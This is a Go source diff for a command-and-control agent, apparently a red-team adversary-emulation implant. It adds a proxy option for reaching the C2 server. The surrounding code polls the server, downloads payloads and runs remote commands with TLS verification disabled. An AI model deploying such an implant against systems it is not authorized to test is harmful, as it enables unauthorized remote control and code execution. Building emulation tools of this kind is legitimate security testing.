@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net/http"
+	"net/url"
 	"os"
 	"os/user"
 	"reflect"
@@ -33,7 +34,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				fmt.Printf("[*] Running instruction %s\n", command["id"])
-				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
+				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string), profile["c2Proxy"].(*url.URL))
 				go coms.RunInstruction(command, profile, payloads)
 				util.Sleep(command["sleep"].(float64))
 			}
@@ -43,7 +44,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string) map[string]interface{} {
+func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string, c2Proxy string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	rand.Seed(time.Now().UnixNano())
@@ -65,6 +66,21 @@ func buildProfile(server string, group string, sleep int, executors []string, pr
 	profile["privilege"] = privilege
 	profile["exe_name"] = filepath.Base(os.Args[0])
 	profile["c2"] = strings.ToUpper(c2)
+	// profile["c2Proxy"] = c2Proxy
+
+	var c2ProxyUrl *url.URL = nil
+
+	// Parse c2 proxy URL to get *url.URL object object.
+	if len(c2Proxy) > 0 {
+        proxyUrl, err := url.Parse(c2Proxy)
+        if proxyUrl == nil || err != nil {
+            output.VerbosePrint("[-] Invalid c2 proxy URL. Defaulting to no c2 proxy.")
+        } else {
+            c2ProxyUrl = proxyUrl
+        }
+    }
+
+    profile["c2Proxy"] = c2ProxyUrl
 
 	return profile
 }
@@ -77,7 +93,7 @@ func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[str
 		coms, _ = contact.CommunicationChannels[profile["c2"].(string)]
 	}
 
-	if coms.Ping(profile["server"].(string)) {
+	if coms.Ping(profile["server"].(string), profile["c2Proxy"].(*url.URL)) {
 		//go util.StartProxy(profile["server"].(string))
 		return coms
 	}
@@ -98,7 +114,7 @@ func validC2Configuration(coms contact.Contact, c2Selection string, c2Config map
 	return false
 }
 
-func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, verbose bool) {
+func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, c2Proxy string, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	sleepInt, _ := strconv.Atoi(sleep)
@@ -112,8 +128,9 @@ func Core(server string, group string, sleep string, delay int, executors []stri
 	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
 	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
+	output.VerbosePrint(fmt.Sprintf("c2 proxy=%s", c2Proxy))
 
-	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"])
+	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"], c2Proxy)
 	util.Sleep(float64(delay))
 
 	for {
